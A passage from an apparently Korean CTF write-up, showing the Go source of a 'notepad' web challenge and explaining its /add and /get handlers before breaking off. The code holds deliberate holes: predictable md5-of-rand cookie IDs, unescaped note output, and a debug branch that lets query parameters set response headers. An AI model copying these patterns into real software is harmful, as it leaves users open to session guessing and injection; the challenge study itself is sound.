<span class="p">)</span>

<span class="k">const</span> <span class="n">adminID</span> <span class="o">=</span> <span class="s">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>
<span class="k">const</span> <span class="n">adminNOTE</span> <span class="o">=</span> <span class="s">"inctf{flag}"</span>

<span class="k">var</span> <span class="n">Notes</span> <span class="o">=</span> <span class="nb">make</span><span class="p">(</span><span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span>

<span class="c">// Prevent XSS on api-endpoints ¬‿¬</span>
<span class="k">var</span> <span class="n">cType</span> <span class="o">=</span> <span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
	<span class="s">"Content-Type"</span><span class="o">:</span>            <span class="s">"text/plain"</span><span class="p">,</span>
	<span class="s">"x-content-type-options"</span><span class="o">:</span>  <span class="s">"nosniff"</span><span class="p">,</span>
	<span class="s">"X-Frame-Options"</span><span class="o">:</span>         <span class="s">"DENY"</span><span class="p">,</span>
	<span class="s">"Content-Security-Policy"</span><span class="o">:</span> <span class="s">"default-src 'none';"</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">cookGenerator</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="n">hash</span> <span class="o">:=</span> <span class="n">md5</span><span class="o">.</span><span class="n">Sum</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">30</span><span class="p">))))</span>
	<span class="k">return</span> <span class="n">hex</span><span class="o">.</span><span class="n">EncodeToString</span><span class="p">((</span><span class="n">hash</span><span class="p">)[</span><span class="o">:</span><span class="p">])</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">headerSetter</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">header</span> <span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">header</span> <span class="p">{</span>
		<span class="n">w</span><span class="o">.</span><span class="n">Header</span><span class="p">()</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">,</span> <span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="k">var</span> <span class="n">cooke</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">Cookie</span><span class="p">(</span><span class="s">"id"</span><span class="p">)</span>
	<span class="n">re</span> <span class="o">:=</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="s">"^[a-zA-Z0-9]+$"</span><span class="p">)</span>
	<span class="k">var</span> <span class="n">cookeval</span> <span class="kt">string</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">re</span><span class="o">.</span><span class="n">MatchString</span><span class="p">(</span><span class="n">cooke</span><span class="o">.</span><span class="n">Value</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cooke</span><span class="o">.</span><span class="n">Value</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="m">35</span> <span class="o">&amp;&amp;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cooke</span><span class="o">.</span><span class="n">Value</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="m">30</span> <span class="p">{</span>
		<span class="n">cookeval</span> <span class="o">=</span> <span class="n">cooke</span><span class="o">.</span><span class="n">Value</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">cookeval</span> <span class="o">=</span> <span class="n">cookGenerator</span><span class="p">()</span>
		<span class="n">c</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Cookie</span><span class="p">{</span>
			<span class="n">Name</span><span class="o">:</span>     <span class="s">"id"</span><span class="p">,</span>
			<span class="n">Value</span><span class="o">:</span>    <span class="n">cookeval</span><span class="p">,</span>
			<span class="n">SameSite</span><span class="o">:</span> <span class="m">2</span><span class="p">,</span>
			<span class="n">HttpOnly</span><span class="o">:</span> <span class="no">true</span><span class="p">,</span>
			<span class="n">Secure</span><span class="o">:</span>   <span class="no">false</span><span class="p">,</span>
		<span class="p">}</span>
		<span class="n">http</span><span class="o">.</span><span class="n">SetCookie</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">cookeval</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">add</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">id</span> <span class="o">:=</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">id</span> <span class="o">!=</span> <span class="n">adminID</span> <span class="p">{</span>
		<span class="n">r</span><span class="o">.</span><span class="n">ParseForm</span><span class="p">()</span>
		<span class="n">noteConte</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"content"</span><span class="p">)</span>
		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">noteConte</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">75</span> <span class="p">{</span>
			<span class="n">Notes</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">noteConte</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"OK"</span><span class="p">)</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">get</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">id</span> <span class="o">:=</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>
	<span class="n">x</span> <span class="o">:=</span> <span class="n">Notes</span><span class="p">[</span><span class="n">id</span><span class="p">]</span>
	<span class="n">headerSetter</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">cType</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"404 No Note Found"</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="s">"&lt;[a-zA-Z0-9]"</span><span class="p">)</span><span class="o">.</span><span class="n">MatchString</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">html</span><span class="o">.</span><span class="n">EscapeString</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">find</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">id</span> <span class="o">:=</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>

	<span class="n">param</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Query</span><span class="p">()</span>
	<span class="n">x</span> <span class="o">:=</span> <span class="n">Notes</span><span class="p">[</span><span class="n">id</span><span class="p">]</span>

	<span class="k">var</span> <span class="n">which</span> <span class="kt">string</span>
	<span class="n">str</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">param</span><span class="p">[</span><span class="s">"condition"</span><span class="p">]</span>
	<span class="k">if</span> <span class="o">!</span><span class="n">err</span> <span class="p">{</span>
		<span class="n">which</span> <span class="o">=</span> <span class="s">"any"</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">which</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="m">0</span><span class="p">]</span>
	<span class="p">}</span>

	<span class="k">var</span> <span class="n">start</span> <span class="kt">bool</span>
	<span class="n">str</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="s">"startsWith"</span><span class="p">]</span>
	<span class="k">if</span> <span class="o">!</span><span class="n">err</span> <span class="p">{</span>
		<span class="n">start</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">"arthur"</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">start</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
	<span class="p">}</span>
	<span class="k">var</span> <span class="n">responseee</span> <span class="kt">string</span>
	<span class="k">var</span> <span class="n">end</span> <span class="kt">bool</span>
	<span class="n">str</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="s">"endsWith"</span><span class="p">]</span>
	<span class="k">if</span> <span class="o">!</span><span class="n">err</span> <span class="p">{</span>
		<span class="n">end</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasSuffix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">"morgan"</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">end</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasSuffix</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"starts"</span> <span class="o">&amp;&amp;</span> <span class="n">start</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"ends"</span> <span class="o">&amp;&amp;</span> <span class="n">end</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"both"</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">start</span> <span class="o">&amp;&amp;</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">which</span> <span class="o">==</span> <span class="s">"any"</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">start</span> <span class="o">||</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="n">x</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">_</span><span class="p">,</span> <span class="n">present</span> <span class="o">:=</span> <span class="n">param</span><span class="p">[</span><span class="s">"debug"</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">present</span> <span class="p">{</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"debug"</span><span class="p">)</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"startsWith"</span><span class="p">)</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"endsWith"</span><span class="p">)</span>
			<span class="nb">delete</span><span class="p">(</span><span class="n">param</span><span class="p">,</span> <span class="s">"condition"</span><span class="p">)</span>

			<span class="k">for</span> <span class="n">v</span><span class="p">,</span> <span class="n">d</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">param</span> <span class="p">{</span>
				<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">k</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">d</span> <span class="p">{</span>

					<span class="k">if</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="s">"^[a-zA-Z0-9{}_;-]*$"</span><span class="p">)</span><span class="o">.</span><span class="n">MatchString</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">5</span> <span class="p">{</span>
						<span class="n">w</span><span class="o">.</span><span class="n">Header</span><span class="p">()</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
					<span class="p">}</span>
					<span class="k">break</span>
				<span class="p">}</span>
				<span class="k">break</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="n">responseee</span> <span class="o">=</span> <span class="s">"404 No Note Found"</span>
	<span class="p">}</span>
	<span class="n">headerSetter</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">cType</span><span class="p">)</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">responseee</span><span class="p">)</span>
<span class="p">}</span>

<span class="c">// Reset notes every 30 mins.  No Vuln in this</span>
<span class="k">func</span> <span class="n">resetNotes</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">Notes</span><span class="p">[</span><span class="n">adminID</span><span class="p">]</span> <span class="o">=</span> <span class="n">adminNOTE</span>
	<span class="k">for</span> <span class="k">range</span> <span class="n">time</span><span class="o">.</span><span class="n">Tick</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">1</span> <span class="o">*</span> <span class="m">60</span> <span class="o">*</span> <span class="m">30</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">Notes</span> <span class="o">=</span> <span class="nb">make</span><span class="p">(</span><span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span>
		<span class="n">Notes</span><span class="p">[</span><span class="n">adminID</span><span class="p">]</span> <span class="o">=</span> <span class="n">adminNOTE</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">rand</span><span class="o">.</span><span class="n">Seed</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">UnixNano</span><span class="p">())</span>

	<span class="k">var</span> <span class="n">dir</span> <span class="kt">string</span>
	<span class="n">flag</span><span class="o">.</span><span class="n">StringVar</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir</span><span class="p">,</span> <span class="s">"dir"</span><span class="p">,</span> <span class="s">"./public"</span><span class="p">,</span> <span class="s">"the directory to serve files from. Defaults to the current dir"</span><span class="p">)</span>
	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
	<span class="k">go</span> <span class="n">resetNotes</span><span class="p">()</span>
	<span class="n">r</span> <span class="o">:=</span> <span class="n">mux</span><span class="o">.</span><span class="n">NewRouter</span><span class="p">()</span>
	<span class="n">s</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">Host</span><span class="p">(</span><span class="s">"chall.notepad15.gq:1515"</span><span class="p">)</span><span class="o">.</span><span class="n">Subrouter</span><span class="p">()</span>
	<span class="n">s</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/add"</span><span class="p">,</span> <span class="n">add</span><span class="p">)</span><span class="o">.</span><span class="n">Methods</span><span class="p">(</span><span class="s">"POST"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/get"</span><span class="p">,</span> <span class="n">get</span><span class="p">)</span><span class="o">.</span><span class="n">Methods</span><span class="p">(</span><span class="s">"GET"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/find"</span><span class="p">,</span> <span class="n">find</span><span class="p">)</span><span class="o">.</span><span class="n">Methods</span><span class="p">(</span><span class="s">"GET"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">PathPrefix</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span><span class="o">.</span><span class="n">Handler</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">StripPrefix</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">FileServer</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="n">dir</span><span class="p">))))</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Server started at http://0.0.0.0:3000"</span><span class="p">)</span>
	<span class="n">loggedRouter</span> <span class="o">:=</span> <span class="n">handlers</span><span class="o">.</span><span class="n">LoggingHandler</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Stdout</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
	<span class="n">srv</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">http</span><span class="o">.</span><span class="n">Server</span><span class="p">{</span>
		<span class="n">Addr</span><span class="o">:</span> <span class="s">"0.0.0.0:3000"</span><span class="p">,</span>
		<span class="c">// Good practice to set timeouts to avoid Slowloris attacks.</span>
		<span class="n">WriteTimeout</span><span class="o">:</span> <span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">15</span><span class="p">,</span>
		<span class="n">ReadTimeout</span><span class="o">:</span>  <span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">15</span><span class="p">,</span>
		<span class="n">IdleTimeout</span><span class="o">:</span>  <span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">60</span><span class="p">,</span>
		<span class="n">Handler</span><span class="o">:</span>      <span class="n">loggedRouter</span><span class="p">,</span> <span class="c">// Pass our instance of gorilla/mux in.</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">srv</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">();</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>해당 문제의 서버는 <code class="language-plaintext highlighter-rouge">Go</code>라는 프로그래밍 언어로 작성이 되어 있습니다.</p>

<div class="language-go highlighter-rouge"><div class="code-header">
        <span data-label-text="Go"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">rand</span><span class="o">.</span><span class="n">Seed</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">UnixNano</span><span class="p">())</span>

	<span class="k">var</span> <span class="n">dir</span> <span class="kt">string</span>
	<span class="n">flag</span><span class="o">.</span><span class="n">StringVar</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir</span><span class="p">,</span> <span class="s">"dir"</span><span class="p">,</span> <span class="s">"./public"</span><span class="p">,</span> <span class="s">"the directory to serve files from. Defaults to the current dir"</span><span class="p">)</span>
	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
	<span class="k">go</span> <span class="n">resetNotes</span><span class="p">()</span>
	<span class="n">r</span> <span class="o">:=</span> <span class="n">mux</span><span class="o">.</span><span class="n">NewRouter</span><span class="p">()</span>
	<span class="n">s</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">Host</span><span class="p">(</span><span class="s">"chall.notepad15.gq:1515"</span><span class="p">)</span><span class="o">.</span><span class="n">Subrouter</span><span class="p">()</span>
	<span class="n">s</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/add"</span><span class="p">,</span> <span class="n">add</span><span class="p">)</span><span class="o">.</span><span class="n">Methods</span><span class="p">(</span><span class="s">"POST"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/get"</span><span class="p">,</span> <span class="n">get</span><span class="p">)</span><span class="o">.</span><span class="n">Methods</span><span class="p">(</span><span class="s">"GET"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/find"</span><span class="p">,</span> <span class="n">find</span><span class="p">)</span><span class="o">.</span><span class="n">Methods</span><span class="p">(</span><span class="s">"GET"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">PathPrefix</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span><span class="o">.</span><span class="n">Handler</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">StripPrefix</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">FileServer</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="n">dir</span><span class="p">))))</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Server started at http://0.0.0.0:3000"</span><span class="p">)</span>
	<span class="n">loggedRouter</span> <span class="o">:=</span> <span class="n">handlers</span><span class="o">.</span><span class="n">LoggingHandler</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Stdout</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
	<span class="n">srv</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">http</span><span class="o">.</span><span class="n">Server</span><span class="p">{</span>
		<span class="n">Addr</span><span class="o">:</span> <span class="s">"0.0.0.0:3000"</span><span class="p">,</span>
		<span class="c">// Good practice to set timeouts to avoid Slowloris attacks.</span>
		<span class="n">WriteTimeout</span><span class="o">:</span> <span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">15</span><span class="p">,</span>
		<span class="n">ReadTimeout</span><span class="o">:</span>  <span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">15</span><span class="p">,</span>
		<span class="n">IdleTimeout</span><span class="o">:</span>  <span class="n">time</span><span class="o">.</span><span class="n">Second</span> <span class="o">*</span> <span class="m">60</span><span class="p">,</span>
		<span class="n">Handler</span><span class="o">:</span>      <span class="n">loggedRouter</span><span class="p">,</span> <span class="c">// Pass our instance of gorilla/mux in.</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">srv</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">();</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">main()</code> 함수는 go 파일이 실행될 때, 실행이 되는 곳 입니다. C언어에 main() 함수와 동일 합니다. 일단 코드를 보면 <code class="language-plaintext highlighter-rouge">/add</code>, <code class="language-plaintext highlighter-rouge">/get</code>, <code class="language-plaintext highlighter-rouge">/find</code>, <code class="language-plaintext highlighter-rouge">/</code> 경로로 라우팅을 시켜주는 것을 볼 수 있습니다.</p>

<div class="language-go highlighter-rouge"><div class="code-header">
        <span data-label-text="Go"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="k">func</span> <span class="n">add</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">id</span> <span class="o">:=</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">id</span> <span class="o">!=</span> <span class="n">adminID</span> <span class="p">{</span>
		<span class="n">r</span><span class="o">.</span><span class="n">ParseForm</span><span class="p">()</span>
		<span class="n">noteConte</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"content"</span><span class="p">)</span>
		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">noteConte</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">75</span> <span class="p">{</span>
			<span class="n">Notes</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">noteConte</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"OK"</span><span class="p">)</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">/add</code> 기능은 메모 작성을 저장하는 기능인데 코드를 보면 <code class="language-plaintext highlighter-rouge">getIDFromCooke()</code> 함수를 이용해서 쿠키에서 <code class="language-plaintext highlighter-rouge">id</code>를 가져 온 후에 <code class="language-plaintext highlighter-rouge">id</code>가 관리자 아이디와 동일하지 않으면 입력한 값을 <code class="language-plaintext highlighter-rouge">Notes[id]</code>에 넣어주는 것을 볼 수 있습니다. 여기서 <code class="language-plaintext highlighter-rouge">getIDFromCooke()</code> 함수는 그냥 현재 요청 한 사용자의 쿠키에서 <code class="language-plaintext highlighter-rouge">id</code> 값을 가져와서 <code class="language-plaintext highlighter-rouge">id</code>가 없으면 생성하고, 있으면 그냥 그 값을 반환해주는 함수입니다.</p>

<div class="language-go highlighter-rouge"><div class="code-header">
        <span data-label-text="Go"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="k">func</span> <span class="n">get</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">id</span> <span class="o">:=</span> <span class="n">getIDFromCooke</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>
	<span class="n">x</span> <span class="o">:=</span> <span class="n">Notes</span><span class="p">[</span><span class="n">id</span><span class="p">]</span>
	<span class="n">headerSetter</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">cType</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
